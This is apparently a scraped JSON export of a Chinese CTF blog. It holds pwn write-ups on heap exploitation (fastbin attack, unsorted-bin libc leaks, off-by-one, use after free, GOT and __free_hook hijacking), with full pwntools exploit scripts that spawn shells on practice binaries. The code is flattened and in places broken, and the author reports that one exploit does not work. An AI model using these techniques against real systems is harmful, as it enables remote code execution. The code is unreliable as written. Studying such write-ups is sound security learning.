p64(libc_start_add) + p64(puts_got) + p64(main_add)p.recvuntil('Pull up your sword and tell me u story!\\n')p.send(payload)libc_add = u64(p.recv(6).strip('\\n').ljust(8,'\\x00'))log.success(\"libc_add: \"+hex(libc_add))libc = LibcSearcher(\"__libc_start_main\",int(libc_add))libc_base = libc_add - libc.dump('__libc_start_main')sys_add = libc_base + libc.dump('system')bin_add = libc_base + libc.dump('str_bin_sh')log.success(\"sys_add:\" +hex(sys_add))log.success(\"bin_add: \"+hex(bin_add))payload0 = 'a' * offset + p64(pop_rdi) + p64(bin_add) + p64(sys_add)p.recvuntil('Pull up your sword and tell me u story!\\n')p.send(payload0)p.interactive() 17.[ZJCTF 2019]EasyHeap常见的堆溢出，注意一下几点： 1.此题没有show功能，且无法进行字节覆盖，不适合使用unsortbin 泄露libc基地址 2.由于buu没有复现，给出的后门无法利用 3.我relro没有完全开启，我们可以通过挟持free_got地址来进行geshell 4，挟持后，free函数的参数即为我们system函数的参数（参数如果为地址的话，地址指向的数据为参数） 5.我们通过IDA可以查看heaparry的地址，通过查看周围可以伪造堆的size位，即 0x6020d0-3 6.可以通过覆盖fd来获得堆，之后通过edit功能修改heaparry，可以将存储的堆地址覆盖为free_got地址，之后，通过edit功能其修改就挟持了got地址 7.之后通过/bin/sh的写入以及调用free函数（被挟持）来实现getshell 最重要的是伪造堆的那块 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './easyheap'#libc_name = ''ip = 'node3.buuoj.cn'port = '27847'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)def create(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of Heap :') p.send(str(size)) p.recvuntil('Content of heap:') p.send(str(content))def edit(index,size,content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index)) p.recvuntil('Size of Heap :') p.send(str(size)) p.recvuntil('Content of heap :') p.send(str(content))def free(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))sys_add = 0x400423free_got = elf.got['free']sys_add = 0x00000000000400C2Ccreate(0x68,'aaaa')#0create(0x68,'aaaa')#1create(0x68,'aaaa')#2free(2)payload0 = '/bin/sh\\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3) #index=2的堆的前八字节位index=1的堆的数据edit(1,len(payload0),payload0)create(0x68,'aaaa')#2create(0x68,'c')#3payload2 = '\\xaa' * 3 +p64(0)*4 + p64(free_got)edit(3,len(payload2),payload2)payload3 = p64(elf.plt['system'])edit(0,len(payload3),payload3)#此时free的参数即为syscall的参数free(1)#gdb.attach(p)p.interactive()","categories":[],"tags":[],"author":"summerN"},{"title":"fastbin-attack 2014 hack.lu oreo ","slug":"fastbin-attack 2014 hack.lu oreo ","date":"2020-02-11T13:48:53.054Z","updated":"2020-02-07T15:32:41.957Z","comments":true,"path":"2020/02/11/fastbin-attack 2014 hack.lu oreo /","link":"","permalink":"http://summern.club/2020/02/11/fastbin-attack%202014%20hack.lu%20oreo%20/","excerpt":"fastbin-attack 2014 hack.lu","text":"fastbin-attack 2014 hack.lu 这应该是我能看得懂的第一个堆类题目了 首先checksec 还可 看程序 [ 大体来说有三个功能 1.add 2.show_add 3.order 4.msg 5.show_stats 6.exit 先看add [ 这里我们调试一下 发现我们输入的是一个结构体 dword_804A288代表堆地址我们成为tmp_heap tmp_heap+13 实际上是 +52个字节，这里放置的是上一个heap的地址，即last_heap 然后tmp_heap后面的25个字节后放name 在tmp_heap后面放description fgets存在溢出，我们可以输入的字节为56个，我们可以通过name来覆盖掉last_heap的地址，然后通过show_add()来泄露libc基地址 同时0x804a2a4位置内容加一 且我们可以看到0x804a2a8存放了0x804a2c0的地址 图床不好，，先不放图。。抱歉 step 1我们先泄露出libc的基地址 我们name输入‘a’*27之后，在输入就会覆盖掉last_heap 123456789101112#leak libcputs_got = elf.got['puts']name = 'a' * 27 + p32(puts_got)add(name,'a'*25)show_add()p.recvuntil('Description: ')p.recvuntil('Description: ')puts_add = p.recv(4).strip('\\n').ljust(4,'\\x00')libc = LibcSearcher(puts,int(puts_add))libc_add = puts_add - libc.dump('puts')system_add = libc_add + libc.dump('system')str_bin_sh = libc_add + libc.dump('str_bin_sh') step2要在bss段上分配堆，首先需要堆上有合适的size以满足malloc(0x38)的条件。这里我们需要的size为0x40，这是因为我们的数据结构的内容大小为0x38，因此整个chunk的size就为0x40。而如果data段是从0x0804a2a8开始，那么size就位于0x0804a2a8-4=0x0804a2a4处，观察一下这里刚好是number的地址，number的地址就为我们构造堆的大小的位置，因此我们就需要在分配到0x0804a2a8前添加0x40次。 所以我们先申请0x40-2次，因为我们之前已经申请了一次，并且这些的last_heap腰腹改为\\x00且最后一个我们的last_heap为0x804a2a8 123456#fake chunkname1 = 'a' * 27 + p32(0)for i in range(0x3e): add(name1,'a' * 25)name2 = 'a' * 27 + p32(0x0804a2a8)add(name2,'a' * 25) 之后我们需要绕过next_chunksize的检查 刚才我们知道0x804a2a8存放了0x804a2c0的地址 并且根据源码可知，我们的msg通过这个地址放入到了0x804a2c0处 我们的fake_chunk从0x804a2a8开始 所以长度为：0x38-(0x804a2c0-0x804a2a8)=0x20 这里的last_chunk也要设置为0000防止出现再free 并且还要设置大小，这个大小很随意，符合条件即可 所以有 123#我们需要绕过next_chunksize的检查payload = '\\x00' * 0x20 + '\\x00' * 4 + p32(100)msg(payload) 之后free掉就可以 之后我们看一下链表 发现fastbin空闲链表中有我们的伪造的链表0x804a2a0 data区域位0x804a2a0 + 8 = 0x804a2a8 step3最后就是getshell的步骤，即劫持got地址 因为我们每次的输入都会执行到刚开始输入action的时候，那是都会执行__isoc99_sscanf这个函数 所以我们劫持他的got地址即可 123456p.recvuntil('submitted!\\n')payload1 = elf.got['__isoc99_sscanf']add('a',payload1)msg(p32(system_add)+';/bin/sh\\x00')#p.sendline('/bin/sh\\x00')p.interactive() [ 显而易见，这里get一个新的bin/方法 这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);分号代表system函数将这个参数分成两部分，先后执行里面的命令。因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”); 这样就能实现最终目的了。 完成，耗时三天，撒花0.0","categories":[],"tags":[]},{"title":"通过2017 0ctf babyheap 学习unsortbin泄露libc地址","slug":"通过2017 0ctf babyheap 学习unsortbin泄露libc地址","date":"2020-02-11T13:45:38.424Z","updated":"2020-02-11T13:45:54.932Z","comments":true,"path":"2020/02/11/通过2017 0ctf babyheap 学习unsortbin泄露libc地址/","link":"","permalink":"http://summern.club/2020/02/11/%E9%80%9A%E8%BF%872017%200ctf%20babyheap%20%E5%AD%A6%E4%B9%A0unsortbin%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/","excerpt":"通过2017 0ctf babyheap 学习unsortbin泄露libc地址","text":"通过2017 0ctf babyheap 学习unsortbin泄露libc地址 注意一下top chunk一、top chunk 当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk二、top chunk的合并操作 如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk 如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk线上一下leak部分代码： 123456789101112131415161718192021222324252627282930313233343536#leek libccreate(0x10)#index=0create(0x10)#index=1create(0x10)#index=2create(0x10)#index=3create(0x80)#index=4free(1) #这两个free将1，2放入fastbin 链表中，使得可以修改链表中index=1的地址（通过修改fd）free(2)payload1 = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)fill(0,payload1)#这里就是通过修改fd指针来修改fastbin链表payload2 = p64(0) * 3 + p64(0x21)fill(3,payload2)#修改一下大小使得可以通过机制create(0x10)create(0x10)#这里第一个申请的是之前的index=2，第二个申请的堆的地址是我们伪造的地址，与index=4的地址相同payload3 = p64(0) * 3 + p64(0x91)fill(3,payload3)#这里的话是将大小修改过来，为之后的放入unsort bin做准备create(0x80)#这里是为了防止top chunk合并free的small bin（index=4）看本文开头free(4)#gdb.attach(p)dump(2)p.recvuntil('Content: ')#p.recvuntil('\\x00' * 0x)main_arena = u64(p.recv(8).strip('\\n').ljust(8,'\\x00'))log.info(\"main_arena: \"+hex(main_arena))#这里就泄露出来了#gdb.attach(p)offset = 0x7fffff3f4b78 - 88 - 0x7fffff030000#这里是根据本机计算出的offset，offset是恒定不变的log.info(\"offset: \"+hex(offset))libc_base = main_arena - 88 -offsetlog.success(\"libc_base: \"+hex(libc_base)) 正向思考： 1.我们发现存在dump函数可以输出一个堆中的数据，那么我们就思考怎样将一个堆内容设置为可以泄露libc的地址 2.通过观察我们可以发现这里存在一个堆溢出，可以尝试使用unsort bin泄露libc 我们需要一个可以在free后放入unsort bin的堆，并且需要将另一个堆的地址覆盖为，这个放入unsort bin的地址，我们发现可以通过堆溢出进行最低字节的覆盖，由于在申请堆空间的时候，会有一个检查堆大小是否与当前位置大小对应的机制，所以我们在 free后再次申请的时候，需要将那个空间大的堆的大小修改一下，申请完可以再修改回来 3.之后我们free掉small bin，然后读取就可以了。 具体解释在exp中","categories":[],"tags":[]},{"title":"off by one","slug":"off by one","date":"2020-02-09T10:23:19.014Z","updated":"2020-02-10T06:48:08.969Z","comments":true,"path":"2020/02/09/off by one/","link":"","permalink":"http://summern.club/2020/02/09/off%20by%20one/","excerpt":"off by one例题：book","text":"off by one例题：book 这里我们需要简单介绍一下__free_hook函数 当调用free函数的时候当__free_hook内容不为NULL时，会优先执行其内容，所以我们将该函数参数设置为system，就可以实现getshell 步骤：题目是一个常见的选单式程序，功能是一个图书管理系统。 1234561. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit 程序提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示。 12345Canary : NoNX : YesPIE : YesFortify : NoRelRO : Full createbook结构中存在name和description，name和description在堆上分配。首先分配name buffer，使用malloc，大小自定但小于32。 1234printf(&quot;\\nEnter book name size: &quot;, *(_QWORD *)&amp;size);__isoc99_scanf(&quot;%d&quot;, &amp;size);printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);ptr &#x3D; malloc(size); 之后分配description，同样大小自定但无限制。 1234printf(&quot;\\nEnter book description size: &quot;, *(_QWORD *)&amp;size); __isoc99_scanf(&quot;%d&quot;, &amp;size);v5 &#x3D; malloc(size); 之后分配book结构的内存 12345678910book &#x3D; malloc(0x20uLL);if ( book )&#123; *((_DWORD *)book + 6) &#x3D; size; *((_QWORD *)off_202010 + v2) &#x3D; book; *((_QWORD *)book + 2) &#x3D; description; *((_QWORD *)book + 1) &#x3D; name; *(_DWORD *)book &#x3D; ++unk_202024; return 0LL;&#125; 漏洞程序编写的read函数存在null byte off-by-one漏洞，仔细观察这个read函数可以发现对于边界的考虑是不当的。 123456789101112131415161718192021signed __int64 __fastcall my_read(_BYTE *ptr, int number)&#123; int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch] _BYTE *buf; &#x2F;&#x2F; [rsp+18h] [rbp-8h] if ( number &lt;&#x3D; 0 ) return 0LL; buf &#x3D; ptr; for ( i &#x3D; 0; ; ++i ) &#123; if ( (unsigned int)read(0, buf, 1uLL) !&#x3D; 1 ) return 1LL; if ( *buf &#x3D;&#x3D; &#39;\\n&#39; ) break; ++buf; if ( i &#x3D;&#x3D; number ) break; &#125; *buf &#x3D; 0; return 0LL;&#125; 根据调试已经ida静态查看，我们发现有如下结构体book struct book: ​ id; ​ *name ​ *description ​ size 1.泄漏因为程序中的my_read函数存在null byte off-by-one，事实上my_read读入的结束符’\\x00’是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符’\\x00’，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。 123450x555555756040: 0x6161616161616161 0x61616161616161610x555555756050: 0x6161616161616161 0x6161616161616161 &lt;&#x3D;&#x3D; author name0x555555756060: 0x0000555555757480 &lt;&#x3D;&#x3D; pointer array 0x00000000000000000x555555756070: 0x0000000000000000 0x00000000000000000x555555756080: 0x0000000000000000 0x0000000000000000 为了实现泄漏，首先在author name中需要输入32个字节来使得结束符被覆盖掉。之后我们创建book1，这个book1的指针会覆盖 这里注意：我们ida查看的时候按照ida给的形式是无法实现的，但是通过自己调试发现是可以实现的，这里告诉我们还是要多调试 具体为：我们先将32个字符填满，导致\\x00被覆盖，之后我们申请book的地址会覆盖溢出到下面的\\x00，通过printf函数可以进行泄露我们申请的第一个book堆的地址（printf函数存在00截断） 12345678auther_name('a'*32)create_book('c',208,'b',32) #此处需要自己计算第一个size的大小，另覆盖后的地址指向desprint_detail()p.recvuntil('a'*32)first_book_add = u64(p.recv(6).strip('\\n').ljust(8,'\\x00'))print hex(first_book_add) 2.伪造book我们发现存在edit author name的功能，这样的话我们可以佳宁我们申请到的第一个book堆的地址的最后两位进行覆盖，得到一个新的地址，而此时，这个新的地址就是我们的伪造book，并且系统默认其为id=1的book 同时，我们发现该程序存在一个函数可以修改description，如果我们将这个最后12位被覆盖的地址指向第一个book的des部分，我们就可以实现对其的写入 所以我们可以根据我们的计算结果去申请第一个book堆 1create_book('c',208,'b',32) #此处需要自己计算第一个size的大小，另覆盖后的地址指向des 12payload1 = p64(1)+p64(first_book_add+0x38)+p64(first_book_add+0x38)+p64(0xffff) #这里add+0x38是为了指向book2的name，因为分配中的chunk的pre与size可以用来存放上一个堆的数据edit(1,payload1) 3.泄露libc基地址1.我们发现我们可以使用改程序的show功能输出book结构体的所有数据 那么我们就可以根据我们伪造的book的内容指向来获取book2的name地址 2.这道题的巧妙之处在于在分配第二个book时，使用一个很大的尺寸，使得堆以mmap模式进行拓展。我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。 在这里我们申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。 1create_book('aa',0x21000,'bb',0x21000) 12345change_name('a'*32) #将第一个book的地址最低两位覆盖print_detail()p.recvuntil('Name: ')name_add=u64(p.recvline().strip('\\n').ljust(8,'\\x00'))print hex(name_add) 但是偏移这一块我还是没大看懂，lib基地址是不断变化的，但是偏移是不变的，所以我们先看一下偏移 1234#offset = name_add-0x7ffff7a0d000#我们需要先通过调试将其算出来，刚开始做的时候这里做错了libc_add = name_add - offsetprint hex(libc_add) 众所周知mmap分配的空间是在堆与栈之间分配的 4.getshell通过上面我们可以获取/bin/sh与system与free__hook的地址 1.我们将前两个地址通过edit（1）可以将book2结构体中存储的name以及des得地址进行覆盖 2.之后可以通过edit（2）将free_hook指向的空间设置为system，这样就可以getshell了 1234567891011121314151617181920212223free_hook = libc.symbols['__free_hook'] + libc_baseprint hex(free_hook)sys_add = libc.symbols['system'] +libc_baseprint hex(sys_add)bin_add = libc.search('/bin/sh').next() + libc_baseprint hex(bin_add)excu_add = libc_base + 0x4526a##getshellpayload2 = p64(free_hook) + p64(free_hook) #fake_book的des指向的是book2的name，我们输入payload会将book的name地址与des地址分别覆盖为free_hookedit(1,payload2)#gdb.attach(p)payload3 = p64(sys_add) #将book2的des的内容设置为sys地址就是将freehook的内容设置为sys_add，这样调用free的时候就会调用sys#edit(2,payload3)#gdb.attach(p)p.recvuntil('&gt;')p.sendline('3')p.recvuntil('Enter the book id you want to edit: ')p.sendline('2')p.recvuntil('Enter new book description: ')p.sendline(payload3)#gdb.attach(p)deleate(2) #调用free时，本该先为free(book_name),现在变成了system(/bin/sh)#gdb.attach(p) 最后我自认为我这个脚本的逻辑很清楚，但是到最后edit（2）的时候就是 123456p.recvuntil('&gt;')p.sendline('3')p.recvuntil('Enter the book id you want to edit: ')p.sendline('2')p.recvuntil('Enter new book description: ')p.sendline(payload3) 当运行到这里的时候，程序总会出现edit description错误，感觉没啥问题，但是就是不行 还请大佬们指教 半完结，半撒花=。= 基础知识： libc基地址每次调用都会变化 最后上完整exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#-*- coding: UTF-8 -*- #!/usr/bin/python2#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './pwn'libc_name = '/lib/x86_64-linux-gnu/libc.so.6'#ip = ''#port = ''#context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)#gdb.attach(p)def create_book(name,size1,des,size2): p.recvuntil('&gt; ') p.sendline(\"1\") p.recvuntil(\": \") p.sendline(str(size1)) p.recvuntil('Enter book name (Max 32 chars):') p.sendline(str(name)) p.recvuntil('Enter book description size:') p.sendline(str(size2)) p.recvuntil('Enter book description:') p.sendline(str(des))def deleate(index): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('Enter the book id you want to delete:') p.send(str(index))def edit(id_a,new_des): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('Enter the book id you want to edit: ') p.sendline(str(id_a)) p.recvuntil('Enter new book description: ') p.sendline(new_des)def print_detail(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt;') p.sendline('5') p.recvuntil('Enter author name:') p.sendline(str(name))def auther_name(name): p.recvuntil('Enter author name:') p.sendline(str(name))auther_name('a'*32)create_book('c',208,'b',32) #此处需要自己计算第一个size的大小，另覆盖后的地址指向desprint_detail()p.recvuntil('a'*32)first_book_add = u64(p.recv(6).strip('\\n').ljust(8,'\\x00'))print hex(first_book_add)#p.recvline()create_book('aa',0x21000,'bb',0x21000)payload1 = p64(1)+p64(first_book_add+0x38)+p64(first_book_add+0x38)+p64(0xffff) #这里add+0x38是为了指向book2的name，因为分配中的chunk的pre与size可以用来存放上一个堆的数据edit(1,payload1)change_name('a'*32) #将第一个book的地址最低两位覆盖print_detail()p.recvuntil('Name: ')name_add=u64(p.recvline().strip('\\n').ljust(8,'\\x00'))print hex(name_add)#offset = name_add-0x7ffff7a0d000#我们需要先通过调试将其算出来，刚开始做的时候这里做错了libc_add = name_add - offsetprint hex(libc_add)free_hook = libc.symbols['__free_hook'] + libc_baseprint hex(free_hook)sys_add = libc.symbols['system'] +libc_baseprint hex(sys_add)bin_add = libc.search('/bin/sh').next() + libc_baseprint hex(bin_add)excu_add = libc_base + 0x4526a##getshellpayload2 = p64(free_hook) + p64(free_hook) #fake_book的des指向的是book2的name，我们输入payload会将book的name地址与des地址分别覆盖为free_hookedit(1,payload2)#gdb.attach(p)payload3 = p64(sys_add) #将book2的des的内容设置为sys地址就是将freehook的内容设置为sys_add，这样调用free的时候就会调用sys#edit(2,payload3)#gdb.attach(p)p.recvuntil('&gt;')p.sendline('3')p.recvuntil('Enter the book id you want to edit: ')p.sendline('2')p.recvuntil('Enter new book description: ')p.sendline(payload3)#gdb.attach(p)deleate(2) #调用free时，本该先为free(book_name),现在变成了system(/bin/sh)#gdb.attach(p)p.interactive()","categories":[],"tags":[]},{"title":"Use after free","slug":"Use after free","date":"2020-02-03T04:14:54.806Z","updated":"2020-02-03T13:05:45.322Z","comments":true,"path":"2020/02/03/Use after free/","link":"","permalink":"http://summern.club/2020/02/03/Use%20after%20free/","excerpt":"Use after free浅学","text":"Use after free浅学 先放个ctf—wiki链接=.= https://wiki.x10sec.org/pwn/heap/use_after_free/ 1,.简述简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。 2.ctf-wiki样例这里我们以 HITCON-training 中的 lab 10 hacknote为例。 功能分析¶我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有 1234puts(&quot; 1. Add note &quot;);puts(&quot; 2. Delete note &quot;);puts(&quot; 3. Print note &quot;);puts(&quot; 4. Exit &quot;); 故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。 add_note¶根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; note *v0; &#x2F;&#x2F; ebx signed int i; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch] int size; &#x2F;&#x2F; [esp+10h] [ebp-18h] char buf; &#x2F;&#x2F; [esp+14h] [ebp-14h] unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch] v5 &#x3D; __readgsdword(0x14u); if ( count &lt;&#x3D; 5 ) &#123; for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] &#x3D; malloc(8u); if ( !notelist[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; notelist[i]-&gt;put &#x3D; print_note_content; printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size &#x3D; atoi(&amp;buf); v0 &#x3D; notelist[i]; v0-&gt;content &#x3D; malloc(size); if ( !notelist[i]-&gt;content ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0, notelist[i]-&gt;content, size); puts(&quot;Success !&quot;); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125; print_note¶print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。 12345678910111213141516171819unsigned int print_note()&#123; int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h] char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h] unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch] v3 &#x3D; __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 &#x3D; atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;&#x3D; count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;&#125; delete_note¶delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h] char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h] unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch] v3 &#x3D; __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 &#x3D; atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;&#x3D; count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) &#123; free(notelist[v1]-&gt;content); free(notelist[v1]); puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; 利用分析[¶](https://wiki.x10sec.org/pwn/heap/use_after_free/#_4我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。 那么该怎么执行呢？ 我们可以简单来看一下每一个note生成的具体流程 程序申请8字节内存用来存放note中的put以及content指针。 程序根据输入的size来申请指定大小的内存，然后用来存储content。 +-----------------+ | put | +-----------------+ | content | size +-----------------+-------------------&gt;+----------------+ | real | | content | | | +----------------+ 123456789101112131415161718192021222324252627282930313233343536那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下- 申请note0，real content size为16（大小与note大小所在的bin不一样即可）- 申请note1，real content size为16（大小与note大小所在的bin不一样即可）- 释放note0- 释放note1- 此时，大小为16的fast bin chunk中链表为note1-&gt;note0- 申请note2，并且设置real content的大小为8，那么根据堆的分配规则- note2其实会分配note1对应的内存块。- real content 对应的chunk其实是note0。 这里注意： 在我们的两次free后 fastbin的结构为： chunk1（8） ——》 chunk0（8） content1（32） ——》chunk0（32） 根据从fastbin中malloc的机制 会根据大小和顺序，我们申请的大小是8字节，因此我们先申请的chunk2（8）为之前的chunk1（8），我们申请的content2（8）为之前的chunk0（8），因此就可以进行写入- 如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。### 利用脚本[¶](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;#_5) #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process(‘./hacknote’) def addnote(size, content): r.recvuntil(“:”) r.sendline(“1”) r.recvuntil(“:”) r.sendline(str(size)) r.recvuntil(“:”) r.sendline(content) def delnote(idx): r.recvuntil(“:”) r.sendline(“2”) r.recvuntil(“:”) r.sendline(str(idx)) def printnote(idx): r.recvuntil(“:”) r.sendline(“3”) r.recvuntil(“:”) r.sendline(str(idx)) #gdb.attach(r)magic = 0x08048986 addnote(32, “aaaa”) # add note 0addnote(32, “ddaa”) # add note 1 delnote(0) # delete note 0delnote(1) # delete note 1 addnote(8, p32(magic)) # add note 2 printnote(0) # print note 0 r.interactive() ``` 3.例题2016Hctf 暂时还不会，，","categories":[],"tags":[]},{"title":"Fastbin attack","slug":"Fastbin attack","date":"2020-02-02T10:12:43.179Z","updated":"2020-02-02T14:28:57.967Z","comments":true,"path":"2020/02/02/Fastbin attack/","link":"","permalink":"http://summern.club/2020/02/02/Fastbin%20attack/","excerpt":"Fastbin attack","text":"Fastbin attack 1、fastbin chunk 结构未分配的chunk| | size ｜| fd ｜ ｜已分配chunk｜ ｜ size ｜｜ content ｜ ……malloc返回的指针指向content位置 1.Fastbin double free注意这里：malloc返回的指针指向content位置 content包含 fd bk 与data Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。 Fastbin Double Free 能够成功利用主要有两部分的原因 fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空 fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。 图解： 如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。 1234567891011int main(void)&#123; void *chunk1,*chunk2,*chunk3; chunk1&#x3D;malloc(0x10); chunk2&#x3D;malloc(0x10); free(chunk1); free(chunk2); free(chunk1); return 0;&#125; 第一次释放free(chunk1) 第二次释放free(chunk2) 第三次释放free(chunk1) 例子： 12345678910111213141516171819202122232425262728int main(void)&#123; void *chunk1,*chunk2,*chunk3; void *chunk_a,*chunk_b;```bss_chunk.size=0x21;chunk1=malloc(0x10); chunk2=malloc(0x10); //a``````free(chunk1);free(chunk2);free(chunk1); //b``````chunk_a=malloc(0x10); //c*(long long *)chunk_a=&amp;bss_chunk; //dmalloc(0x10);malloc(0x10);chunk_b=malloc(0x10); //eprintf(\"%p\",chunk_b);return 0;```&#125; a 此句执行完后，chunk1,chunk2会在连续的区域内，在内存里的表现｜chunk1||chunk2|low addr—–&gt;high addr b 如果直接连续free(chunk1),会被libc检查出double free(检查方式为free时看放入链表的指针与链表现在的指针是否同一个。如fastbin-&gt;a,free(a)则检查出double free。如果fastbin-&gt;b-&gt;a。free(a)则bypass)此时fastbin链表为：main_arena.fastbin—&gt;chunk1—&gt;chunk2—&gt;chunk1（注意chunk1的fd也是指向chunk2,即chunk1和chunk2是一个环形链表）在内存中表现如下：chunk1_addr: ｜ 0 ｜ 0x11 ｜ ｜ chunk2_addr ｜ ｜chunk2_addr: ｜ 0 ｜ 0x11 ｜ ｜ chunk1_addr ｜ ｜ c 分配时从fastbin的首部取出，即chunk_a获得的是chunk1的地址d 修改chunk_a即修改chunk1的fd位置，把此处修改为全局变量bss_chunk的地址此时fastbin链表为fastbin—&gt;chunk2—&gt;chunk1—&gt;bss_chunk e 经过3次malloc(0x11)，依次从fastbin中取出，此次取出的地址就是我们写入的地址","categories":[],"tags":[]},{"title":"内存修改","slug":"内存修改","date":"2020-02-01T09:38:40.703Z","updated":"2020-02-01T09:38:51.574Z","comments":true,"path":"2020/02/01/内存修改/","link":"","permalink":"http://summern.club/2020/02/01/%E5%86%85%E5%AD%98%E4%BF%AE%E6%94%B9/","excerpt":"内存修改","text":"内存修改 如何进行内存的权限修改123456789101112131415161718192021222324252627282930313233341.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call &#x3D; push + jmp所以直接ret后要留一个返回地址,因为ret 就相当于 